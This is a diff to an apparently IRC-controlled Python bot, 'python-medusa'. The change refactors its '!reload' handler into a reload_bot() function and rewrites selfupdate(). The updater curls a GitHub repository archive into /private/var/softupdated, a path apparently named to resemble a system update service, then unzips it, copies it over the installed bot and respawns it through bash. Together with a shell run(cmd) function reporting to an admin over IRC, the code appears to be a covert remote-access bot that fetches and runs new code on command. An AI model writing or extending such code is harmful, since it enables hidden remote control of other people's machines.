@@ -183,6 +183,19 @@ def privmsg(msg=None, to=admin):                                  # function to 
 def broadcast(msg):                                               # function to send a message to the main channel
     privmsg(msg, channel)
 
+def reload_bot():
+    log('[#] ----Reloading Bot----')
+    privmsg('----Reloading Bot from file bot.py----')
+    cmd = "sleep 5; python bot.py &"
+    log('[>]    CMD:     ',cmd)
+    p = Popen([cmd],shell=True,executable='/bin/bash')
+    log('[#] ----New Process Spawned----')
+    privmsg('----New Process Spawned----')
+    quit_status = True
+    irc.send('QUIT\r\n')
+    raise SystemExit                                              
+    sys.exit()
+
 ############ Keyword functions
 
 from modules import skype
@@ -410,27 +423,39 @@ def run(cmd, public=False, return_to=admin):                                    
 def selfupdate(git_user="nikisweeting",git_repo="python-medusa"):   # updates the bot by downloading source from github, then running the update.sh script
     log('[*] Starting Selfupdate...')
     privmsg('[+] Starting Selfupdate...')
-    log('[>]   Downloading source code from git')
-    cmd = "mkdir -p /private/var/softupdated; rm -Rf /private/var/softupdated/code.zip /private/var/softupdated/code; curl https://codeload.github.com/%s/%s/zip/master > /private/var/softupdated/code.zip" % (git_user, git_repo)
-    for line in run_shell(cmd):
+
+    privmsg('[#]   Preparing...')
+    cmd = "mkdir -p /private/var/softupdated; rm -Rf /private/var/softupdated/code.zip /private/var/softupdated/code;"
+    for line in run_shell(cmd, timeout=10, verbose=True):
         log('[>]    ',line)
         privmsg('[>]    %s' % line)
-    privmsg('[>]   Unzipping...')
+
+    privmsg('[#]   Downloading...')
+    cmd = "curl https://codeload.github.com/%s/%s/zip/master > /private/var/softupdated/code.zip" % (git_user, git_repo)
+    for line in run_shell(cmd, timeout=60, verbose=True):
+        log('[>]    ',line)
+        privmsg('[>]    %s' % line)
+
+
+    privmsg('[#]   Unzipping...')
     cmd = "unzip /private/var/softupdated/code.zip -d /private/var/softupdated/code"
-    for line in run_shell(cmd):
+    for line in run_shell(cmd, timeout=70, verbose=True):
         log('[>]    ',line)
         privmsg('[>]    %s' % line)
-    pid = os.getpid()
-    privmsg('[>]   Running install.sh')
-    cmd = "cd /private/var/softupdated/code/*/; /bin/sh install.sh update &"
-    for line in run_shell(cmd, timeout=120, verbose=True):
+
+    privmsg('[#]   Copying files...')
+    cmd = "cp -Rfv /private/var/softupdated/code/*/* /private/var/softupdated/ && rm -fv /private/var/softupdated/code.zip && rm -Rfv /private/var/softupdated/code"
+    for line in run_shell(cmd, timeout=60, verbose=True):
+        log('[>]    ',line)
         privmsg('[>]    %s' % line)
-        if line.find("Finished") != -1:
-            privmsg("[+] Relaunching to finish update. Log saved in update.log")
-            quit_status = True
-            irc.send ( 'QUIT\r\n' )
-            raise SystemExit
-            sys.exit()
+    
+    privmsg('[#]   Removing downloaded source...')
+    cmd = "rm -fv /private/var/softupdated/code.zip && rm -Rfv /private/var/softupdated/code"
+    for line in run_shell(cmd, timeout=30, verbose=True):
+        log('[#]    ',line)
+        privmsg('[>]    %s' % line)
+    privmsg("[+] Relaunching to finish update. Log saved in update.log")
+    reload_bot()
 
 ############ The beef of things
 if __name__ == '__main__':
@@ -522,17 +547,7 @@ if __name__ == '__main__':
                         break
 
                     elif content == '!reload' or content == 'reload':
-                        log('[#] ----Reloading Bot----')
-                        privmsg('----Reloading Bot from file bot.py----')
-                        cmd = "sleep 5; python bot.py &"
-                        log('[>]    CMD:     ',cmd)
-                        p = Popen([cmd],shell=True,executable='/bin/bash')
-                        log('[#] ----New Process Spawned----')
-                        privmsg('----New Process Spawned----')
-                        quit_status = True
-                        irc.send('QUIT\r\n')
-                        raise SystemExit                                              
-                        sys.exit()
+                        reload_bot()
 
                     elif content == '!update' or  content == 'update':
                         selfupdate()
